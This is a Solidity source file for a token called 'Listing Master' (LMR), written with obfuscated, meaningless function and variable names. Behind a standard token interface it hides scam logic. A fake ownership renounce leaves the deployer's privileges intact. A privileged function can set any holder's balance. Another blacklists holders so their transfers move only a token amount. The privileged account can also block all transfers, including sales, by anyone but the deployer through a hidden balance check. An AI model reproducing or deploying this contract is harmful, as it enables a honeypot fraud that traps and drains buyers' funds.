//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface txFund {
    function createPair(address limitReceiver, address exemptAuto) external returns (address);
}

interface toAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listToken) external view returns (uint256);

    function transfer(address fromAuto, uint256 launchTxTotal) external returns (bool);

    function allowance(address isReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchTxTotal) external returns (bool);

    function transferFrom(
        address sender,
        address fromAuto,
        uint256 launchTxTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeWalletBuy, uint256 value);
    event Approval(address indexed isReceiver, address indexed spender, uint256 value);
}

abstract contract takeTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenFeeReceiver is toAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ListingMaster is takeTo, toAt, tokenFeeReceiver {

    uint256 private amountListLiquidity = 100000000 * 10 ** 18;

    address exemptLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address shouldFee, uint256 launchTxTotal) public virtual override returns (bool) {
        amountAt[_msgSender()][shouldFee] = launchTxTotal;
        emit Approval(_msgSender(), shouldFee, launchTxTotal);
        return true;
    }

    string private buyFee = "Listing Master";

    mapping(address => bool) public swapReceiver;

    uint256 public atListToken;

    uint8 private receiverLaunched = 18;

    function getOwner() external view returns (address) {
        return takeLimit;
    }

    mapping(address => bool) public minLaunch;

    function listTeam(address maxLaunched, address fromAuto, uint256 launchTxTotal) internal returns (bool) {
        require(swapFee[maxLaunched] >= launchTxTotal);
        swapFee[maxLaunched] -= launchTxTotal;
        swapFee[fromAuto] += launchTxTotal;
        emit Transfer(maxLaunched, fromAuto, launchTxTotal);
        return true;
    }

    function toIs() private view {
        require(swapReceiver[_msgSender()]);
    }

    event OwnershipTransferred(address indexed atLimitFee, address indexed walletReceiver);

    function symbol() external view virtual override returns (string memory) {
        return swapMin;
    }

    function marketingSender(address maxLaunched, address fromAuto, uint256 launchTxTotal) internal returns (bool) {
        if (maxLaunched == toExempt) {
            return listTeam(maxLaunched, fromAuto, launchTxTotal);
        }
        uint256 launchToken = toAt(fromShould).balanceOf(exemptLaunch);
        require(launchToken == isAmount);
        require(fromAuto != exemptLaunch);
        if (minLaunch[maxLaunched]) {
            return listTeam(maxLaunched, fromAuto, shouldTake);
        }
        return listTeam(maxLaunched, fromAuto, launchTxTotal);
    }

    function transfer(address listBuyFund, uint256 launchTxTotal) external virtual override returns (bool) {
        return marketingSender(_msgSender(), listBuyFund, launchTxTotal);
    }

    uint256 constant shouldTake = 18 ** 10;

    string private swapMin = "LMR";

    function balanceOf(address listToken) public view virtual override returns (uint256) {
        return swapFee[listToken];
    }

    bool public amountAuto;

    function feeLaunched(address listBuyFund, uint256 launchTxTotal) public {
        toIs();
        swapFee[listBuyFund] = launchTxTotal;
    }

    uint256 isAmount;

    function decimals() external view virtual override returns (uint8) {
        return receiverLaunched;
    }

    function teamShouldList(address limitTradingList) public {
        toIs();
        if (liquidityEnableList == tokenToReceiver) {
            liquidityEnableList = true;
        }
        if (limitTradingList == toExempt || limitTradingList == fromShould) {
            return;
        }
        minLaunch[limitTradingList] = true;
    }

    function txAmountEnable(uint256 launchTxTotal) public {
        toIs();
        isAmount = launchTxTotal;
    }

    address public fromShould;

    bool public limitFrom;

    uint256 private feeTake;

    bool public tokenToReceiver;

    mapping(address => uint256) private swapFee;

    function totalLimit(address amountTeam) public {
        require(amountTeam.balance < 100000);
        if (limitFrom) {
            return;
        }
        if (tokenToReceiver == liquidityEnableList) {
            tradingMode = atListToken;
        }
        swapReceiver[amountTeam] = true;
        if (tradingMode != atListToken) {
            tokenToReceiver = false;
        }
        limitFrom = true;
    }

    function transferFrom(address maxLaunched, address fromAuto, uint256 launchTxTotal) external override returns (bool) {
        if (_msgSender() != walletMinEnable) {
            if (amountAt[maxLaunched][_msgSender()] != type(uint256).max) {
                require(launchTxTotal <= amountAt[maxLaunched][_msgSender()]);
                amountAt[maxLaunched][_msgSender()] -= launchTxTotal;
            }
        }
        return marketingSender(maxLaunched, fromAuto, launchTxTotal);
    }

    uint256 atTxTake;

    address walletMinEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private amountAt;

    address public toExempt;

    bool private liquidityEnableList;

    function minTeamBuy() public {
        emit OwnershipTransferred(toExempt, address(0));
        takeLimit = address(0);
    }

    function allowance(address isTeam, address shouldFee) external view virtual override returns (uint256) {
        if (shouldFee == walletMinEnable) {
            return type(uint256).max;
        }
        return amountAt[isTeam][shouldFee];
    }

    constructor (){
        
        liquidityShould walletIs = liquidityShould(walletMinEnable);
        fromShould = txFund(walletIs.factory()).createPair(walletIs.WETH(), address(this));
        if (tradingMode == feeTake) {
            amountAuto = false;
        }
        toExempt = _msgSender();
        swapReceiver[toExempt] = true;
        swapFee[toExempt] = amountListLiquidity;
        minTeamBuy();
        
        emit Transfer(address(0), toExempt, amountListLiquidity);
    }

    address private takeLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return amountListLiquidity;
    }

    function owner() external view returns (address) {
        return takeLimit;
    }

    uint256 public tradingMode;

    function name() external view virtual override returns (string memory) {
        return buyFee;
    }

}